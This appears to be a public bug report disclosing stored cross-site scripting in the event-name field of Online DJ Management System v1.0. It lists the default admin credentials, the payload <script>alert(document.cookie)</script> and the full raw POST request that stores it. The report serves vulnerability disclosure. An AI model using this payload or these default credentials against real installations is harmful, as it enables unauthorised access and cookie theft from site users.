# Online DJ Management System v1.0 has stored cross-site scripting

BUG_Author:yohane

Website source code address: https://www.sourcecodester.com/php/15150/online-dj-management-system-phpoop-free-source-code.html

Vulnerability url: /odjms/classes/Master.php?f=save_event

POST form-data parameter name="name" exists stored cross-site scripting

#### Steps to reproduce

1.Go to the admin Login

http://localhost/odjms/admin/login.php

Default Admin Access: Username: admin / Password: admin123

2.Click on "Event List" and Click on "+ Add New".

3.Put Payload into the name="name" parameter

Payload:<script>alert(document.cookie)</script>

![image](https://github.com/yoyoyoyoyohane/bug_report/blob/main/xss1.png)

4.Click on Save

Transmission packet

```
POST /odjms/classes/Master.php?f=save_event HTTP/1.1
Host: localhost
Content-Length: 456
sec-ch-ua: "Chromium";v="97", " Not;A Brand";v="99"
Accept: application/json, text/javascript, */*; q=0.01
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryP4bIlFlOxTFMP8Qt
X-Requested-With: XMLHttpRequest
sec-ch-ua-mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
sec-ch-ua-platform: "Windows"
Origin: http://localhost
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: http://localhost/odjms/admin/?page=events
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: PHPSESSID=51dsd8ijjls4hhri4d9jare8sk
Connection: close

------WebKitFormBoundaryP4bIlFlOxTFMP8Qt
Content-Disposition: form-data; name="id"


------WebKitFormBoundaryP4bIlFlOxTFMP8Qt
Content-Disposition: form-data; name="name"

<script>alert(document.cookie)</script>
------WebKitFormBoundaryP4bIlFlOxTFMP8Qt
Content-Disposition: form-data; name="description"

b
------WebKitFormBoundaryP4bIlFlOxTFMP8Qt
Content-Disposition: form-data; name="status"

1
------WebKitFormBoundaryP4bIlFlOxTFMP8Qt--
```

5.Payload will trigger when a user visits on http://localhost/odjms/admin/?page=events

![image](https://github.com/yoyoyoyoyohane/bug_report/blob/main/xss2.png)
